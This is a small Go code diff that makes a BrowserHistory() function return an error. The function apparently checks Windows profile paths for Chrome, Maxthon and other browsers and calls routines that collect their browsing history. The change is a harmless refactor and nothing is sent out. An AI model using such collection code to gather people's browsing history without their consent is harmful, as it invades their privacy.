@@ -285,7 +285,7 @@ func MaxthonHistory() {
 	}
 }
 
-func BrowserHistory() {
+func BrowserHistory() error {
 	ChromeLocation := UserHomeDir() + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
 	if _, err := os.Stat(ChromeLocation); err == nil {
 		ChromeHistory()
@@ -380,4 +380,5 @@ func BrowserHistory() {
 	if _, err := os.Stat(MaxthonLocation); err == nil {
 		MaxthonHistory()
 	}
+	return nil
 }
